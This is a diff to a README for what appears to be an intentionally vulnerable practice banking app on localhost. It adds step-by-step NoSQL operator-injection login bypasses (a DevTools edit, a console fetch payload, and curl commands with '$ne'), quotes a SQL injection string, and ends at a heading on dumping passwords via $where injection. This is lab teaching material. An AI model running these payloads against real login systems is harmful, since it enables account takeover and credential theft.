@@ -69,12 +69,50 @@ dev-file leak, JWT forgery, negative transfer, race condition).
 Set `BASE=http://localhost:3000` first for the curl examples.
 
 ### NoSQL auth bypass (log in as admin without the password)
+
+> ⚠️ **You CANNOT do this by just typing into the login boxes.** Unlike SQL
+> (where you type `' OR '1'='1` into the field), NoSQL operator injection needs
+> the password to arrive as an **object** (`{"$ne":"x"}`). A plain text input
+> can only send a string, so typing `$ne`, `{"$ne":"x"}`, or `' OR 1=1` just
+> gets searched for literally and fails. You must change the request shape with
+> one of the three methods below.
+
+**Method 1 — through the form, using DevTools (no terminal needed):**
+1. Open DevTools → **Elements**.
+2. Find the password input: `<input name="password" type="password">`.
+3. Change its `name` attribute to `password[$ne]` so it reads:
+   `<input name="password[$ne]" type="password">`.
+4. Fill the form: **Email** = `admin@bank.local`, **Password box** = any value, e.g. `x`.
+5. Click **Sign in** → logged in as admin.
+
+The browser now sends `email=admin@bank.local&password[$ne]=x`, which Express
+parses into `{ email: "admin@bank.local", password: { $ne: "x" } }` →
+"password ≠ x" → always true. The *field name* carries the `$ne` operator; the
+value you type doesn't matter.
+
+**Method 2 — browser console (paste while on the login page):**
+```js
+fetch('/login', {
+  method: 'POST',
+  headers: { 'Content-Type': 'application/json' },
+  body: JSON.stringify({ email: 'admin@bank.local', password: { $ne: 'x' } })
+}).then(() => location = '/');
+```
+
+**Method 3 — curl:**
 ```bash
+# JSON body
 curl -s -c jar.txt -H 'Content-Type: application/json' \
   -d '{"email":"admin@bank.local","password":{"$ne":"x"}}' \
   $BASE/login -i | grep -i location        # → Location: /
+
+# or form-field bracket syntax (note the brackets, not password=$ne)
+curl -s -c jar.txt -d 'email=admin@bank.local&password[$ne]=x' \
+  $BASE/login -i | grep -i location
 ```
-Form-field version: `email=admin@bank.local&password[$ne]=x`
+
+> If you get "Too many failed attempts", you hit the 3-tries-per-60s limit —
+> wait 60s, restart the server, or log in successfully to reset it.
 
 ### Dump every account + plaintext password ($where injection)
 Open in the browser:
